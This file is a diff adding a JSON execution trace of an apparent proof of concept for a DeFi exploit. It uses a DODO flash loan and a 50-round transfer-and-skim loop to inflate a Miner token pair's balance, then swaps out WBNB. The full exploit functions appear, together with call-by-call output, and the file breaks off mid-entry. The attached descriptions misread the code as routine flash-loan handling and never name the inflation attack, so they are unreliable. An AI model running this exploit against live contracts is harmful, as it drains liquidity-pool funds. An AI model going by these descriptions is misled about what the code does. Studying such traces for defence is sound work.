@@ -1,0 +1,2620 @@
+[
+    {
+        "id": "1419090",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        Miner.approve(address(Router), type(uint256).max);\n        WBNB.approve(address(Router), type(uint256).max);\n        DVM(dodo).flashLoan(10 * 1e18, 0, address(this), abi.encode(0x3078));\n\n        emit log_named_decimal_uint(\"[End] Attacker WBNB balance after exploit\", WBNB.balanceOf(address(this)), 18);\n    }\n\n",
+        "description": "1. **Core functions:**\n   The `testExploit` function is designed to simulate an exploit scenario. It performs three main actions: \n   - It grants maximum approval to the `Router` contract for both the `Miner` and `WBNB` tokens.\n   - It initiates a flash loan of 10 WBNB tokens from the `DVM` contract, specifying the current contract (`address(this)`) as the recipient and encoding additional data (`0x3078`).\n   - Finally, it emits an event to log the attacker's WBNB balance after the exploit.\n\n2. **Security mechanism:**\n   - The function uses `approve` to grant maximum spending allowance to the `Router` contract, which is a common practice to enable token transfers.\n   - The `flashLoan` function is called, which typically involves borrowing funds temporarily and returning them within the same transaction, ensuring no funds are permanently lost.\n   - The function does not include explicit access control or reentrancy guards, which could be a potential security concern depending on the context.\n\n3. **Parameter Function:**\n   - `Miner.approve(address(Router), type(uint256).max);`: This grants the `Router` contract the maximum possible allowance to spend `Miner` tokens on behalf of the caller.\n   - `WBNB.approve(address(Router), type(uint256).max);`: Similarly, this grants the `Router` contract the maximum possible allowance to spend `WBNB` tokens on behalf of the caller.\n   - `DVM(dodo).flashLoan(10 * 1e18, 0, address(this), abi.encode(0x3078));`: This initiates a flash loan of 10 WBNB tokens, with `0` as the second parameter (likely representing a fee or additional data), the current contract as the recipient, and `0x3078` as encoded data.\n\n4. **Return description:**\n   The function does not return any value directly. Instead, it emits an event (`log_named_decimal_uint`) that logs the attacker's WBNB balance after the exploit. The balance is calculated by calling `WBNB.balanceOf(address(this))`, which retrieves the WBNB token balance of the current contract. The balance is then logged with 18 decimal places, which is the standard for many ERC-20 tokens like WBNB.\n\nIn summary, the `testExploit` function simulates an exploit by granting maximum token approvals, initiating a flash loan, and logging the attacker's WBNB balance afterward. It lacks explicit security mechanisms like access control or reentrancy guards, which could be critical depending on the broader context of the contract.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "26915",
+        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "24420",
+        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1343784",
+        "args": "10000000000000000000 [1e19], 0, MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000000000000000000000003078",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1341085",
+        "args": "10000000000000000000 [1e19], 0, MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000000000000000000000003078",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "29962",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000000000000000000 [1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1284697",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000000000000000000 [1e19], 0, 0x0000000000000000000000000000000000000000000000000000000000003078",
+        "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public {\n        address[] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(Miner);\n        uint256[] memory amounts =\n            Router.swapTokensForExactTokens(10 * 1e12, baseAmount, path, address(this), block.timestamp);\n\n        uint256 index = 1;\n        // transfer to pair and skim\n        while (index <= 50) {\n            uint256 balance = Miner.balanceOf(address(this));\n            Miner.transfer(address(Pair), balance);\n            Pair.skim(address(Pair));\n            index++;\n        }\n\n        // end while loop, swap back\n        Pair.swap(0, 3_500_751_853_374_879_579, address(this), \"\");\n        WBNB.transfer(dodo, 10 * 1e18);\n    }\n",
+        "description": "1. **Core functions:**  \n   This function is designed to handle a flash loan operation, which allows borrowing a large amount of tokens temporarily without upfront collateral. It performs a series of token swaps and transfers to execute the loan and repay it within the same transaction. The function first swaps tokens to get the desired amount, then repeatedly transfers and adjusts balances, and finally swaps back to repay the loan.\n\n2. **Security mechanism:**  \n   The function uses a `public` modifier, meaning it can be called by anyone, which could pose a security risk if not properly restricted. It includes a loop that runs up to 50 times, which could be exploited if gas costs are not managed carefully. Additionally, the function relies on external contracts (`Router`, `Miner`, `Pair`, and `WBNB`), so it assumes these contracts are secure and function as expected. The use of `block.timestamp` for the swap deadline introduces a minor risk of manipulation.\n\n3. **Parameter Function:**  \n   - `sender`: The address initiating the flash loan call.  \n   - `baseAmount`: The amount of the base token involved in the swap.  \n   - `quoteAmount`: The amount of the quote token involved in the swap.  \n   - `data`: Additional data passed to the function, though it is not used in this implementation.  \n   These parameters define the details of the flash loan, such as the amounts of tokens to be borrowed and swapped.\n\n4. **Return description:**  \n   The function does not explicitly return a value. Instead, it performs actions like swapping tokens, transferring balances, and repaying the loan. The success of these operations depends on the external contracts and the provided parameters.\n\n**In summary,**  \nThis function facilitates a flash loan by swapping tokens, adjusting balances, and repaying the loan within a single transaction. It relies on external contracts and includes a loop that could be risky if not managed properly. The parameters define the loan details, and the function does not return a value but executes a series of operations to complete the loan process.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "93439",
+        "args": "10000000000000 [1e13], 10000000000000000000 [1e19], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x7C0BFb9fF0aF660D76fb2bd8865E9b49ff033045], MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1707862455 [1.707e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[390037096 [3.9e8], 10000000000000 [1e13]]"
+    },
+    {
+        "id": "2893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "89979999999999999986862 [8.997e22], 3500779900515321108 [3.5e18], 1707744029 [1.707e9]"
+    },
+    {
+        "id": "8225",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 390037096 [3.9e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "71344",
+        "args": "10000000000000 [1e13], 0, MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "36929",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000000000000 [1e13]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89979999989999999986862 [8.997e22]"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "10000000000000 [1e13]"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 10000000000000 [1e13]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18395",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89979999999999999986862 [8.997e22]"
+    },
+    {
+        "id": "6563",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 10000000000000 [1e13]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89980000009999999986862 [8.998e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 20000000000000 [2e13]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89980000029999999986862 [8.998e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 40000000000000 [4e13]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89980000069999999986862 [8.998e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 80000000000000 [8e13]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89980000149999999986862 [8.998e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 160000000000000 [1.6e14]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89980000309999999986862 [8.998e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 320000000000000 [3.2e14]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89980000629999999986862 [8.998e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 640000000000000 [6.4e14]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89980001269999999986862 [8.998e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 1280000000000000 [1.28e15]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89980002549999999986862 [8.998e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 2560000000000000 [2.56e15]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89980005109999999986862 [8.998e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 5120000000000000 [5.12e15]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89980010229999999986862 [8.998e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 10240000000000000 [1.024e16]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89980020469999999986862 [8.998e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 20480000000000000 [2.048e16]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89980040949999999986862 [8.998e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 40960000000000000 [4.096e16]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89980081909999999986862 [8.998e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 81920000000000000 [8.192e16]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89980163829999999986862 [8.998e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 163840000000000000 [1.638e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89980327669999999986862 [8.998e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 327680000000000000 [3.276e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89980655349999999986862 [8.998e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 655360000000000000 [6.553e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
